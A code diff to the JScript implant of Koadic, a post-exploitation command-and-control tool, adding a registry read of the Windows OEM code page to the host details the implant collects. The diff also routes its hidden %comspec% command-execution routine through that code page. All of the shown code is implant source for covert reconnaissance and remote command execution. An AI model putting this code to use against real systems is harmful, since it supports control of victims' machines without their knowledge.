@@ -354,6 +354,8 @@ Koadic.user.info = function()
     info += "~~~" + Koadic.user.Arch();
     info += "~~~" + Koadic.user.CWD();
     info += "~~~" + Koadic.user.IPAddrs();
+    info += "~~~" + Koadic.user.encoder();
+    info += "~~~" + Koadic.user.shellchcp();
 
     return info;
 }
@@ -372,6 +374,20 @@ Koadic.user.encoder = function()
     }
 }
 //user.encoder.end
+
+Koadic.user.shellchcp = function()
+{
+    try
+    {
+        var encoder = Koadic.WS.RegRead("HKLM\\SYSTEM\\CurrentControlSet\\Control\\Nls\\CodePage\\OEMCP");
+        return encoder;
+    }
+    catch(e)
+    {
+        return "437";
+    }
+}
+
 Koadic.work = {};
 
 /*
@@ -850,7 +866,7 @@ Koadic.shell = {};
 //shell.exec.start
 Koadic.shell.exec = function(cmd, stdOutPath)
 {
-    cmd = "chcp " + Koadic.user.encoder() + " & " + cmd;
+    cmd = "chcp " + Koadic.user.shellchcp() + " & " + cmd;
     var c = "%comspec% /q /c " + cmd + " 1> " + Koadic.file.getPath(stdOutPath);
     c += " 2>&1";
     Koadic.WS.Run(c, 0, true);
